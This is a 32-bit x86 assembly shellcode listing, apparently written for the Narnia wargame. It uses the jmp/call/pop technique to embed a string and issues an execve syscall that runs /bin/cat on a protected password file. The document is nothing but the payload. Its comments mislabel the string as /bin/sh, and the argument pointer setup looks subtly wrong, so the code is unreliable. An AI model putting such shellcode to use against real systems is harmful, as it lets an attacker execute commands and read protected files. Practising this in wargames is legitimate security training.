BITS 32

    jmp short two
one:
    pop ebx
    xor eax, eax
    mov [ebx+8], al     ; Null terminate /bin/sh string
    mov [ebx+37], al    ; Null terminate argv string
    mov [ebx+40], eax   ; 4-byte null terminator where BBBB is
    lea ecx, [ebx+12]   ; Load the address of [ebx+8] into ecx for argv ptr
    lea edx, [ebx+40]   ; Environ pointer arg
    mov al, 11
    int 0x80

two:
    call one
    db "/bin/catXXXX/etc/narnia_pass/narnia3XXXBBBB"